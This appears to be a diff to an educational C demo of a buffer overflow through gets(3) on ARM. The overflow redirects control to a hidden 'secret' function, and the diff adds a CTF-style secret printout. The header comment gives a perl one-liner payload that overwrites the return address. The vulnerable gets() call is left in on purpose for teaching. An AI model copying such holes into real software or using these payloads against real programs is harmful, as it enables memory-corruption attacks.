@@ -7,14 +7,16 @@
  * The purpose here is to demonstrate, in three ways, how a simple ROP (Return
  * Oriented Programming) attack - triggered via buffer overflow (BoF) to the
  * (terrible) gets(3) API - can result in the 'secret' function being invoked
- * (even though the code path never directly calls it!).
+ * (even though the original code path never directly calls it!).
  *
+ * After building (with make):
  * 1) One way: direct: by running it like this:
  *  perl -e 'print "A"x12 . "B"x4 . "\xc4\x04\x01\x00"' | ./arm_bof_vuln_reg
  *
  * Of course, the address being passed here (in (1) and (2) via the file input2_secretfunc)
  * is one value I encountered (0x000104c4); you should use nm(1) to lookup the
  * precise address of the 'secret' function and use that value...
+ * The helper script simple_bof_try1.sh does precisely that, and runs all variations.
  *
  * 2) Another way:
  *  ./arm_bof_vuln_reg < input2_secretfunc
@@ -35,9 +37,8 @@
 static void secret_func(void)
 {  
 	char b[25];
-//	snprintf(b, 25, " CTF Secret 0x%lx\n", (unsigned long)&secret_func);
-	//printf("YAY! Entered secret_func() !\n%s\n", b);
-	printf("YAY! Entered secret_func() !\n");
+	snprintf(b, 25, "CTF Secret 0x%lx\n", (unsigned long)&secret_func);
+	printf("YAY! Entered secret_func()! %s\n", b);
 }
 
 static void foo(char *param1)
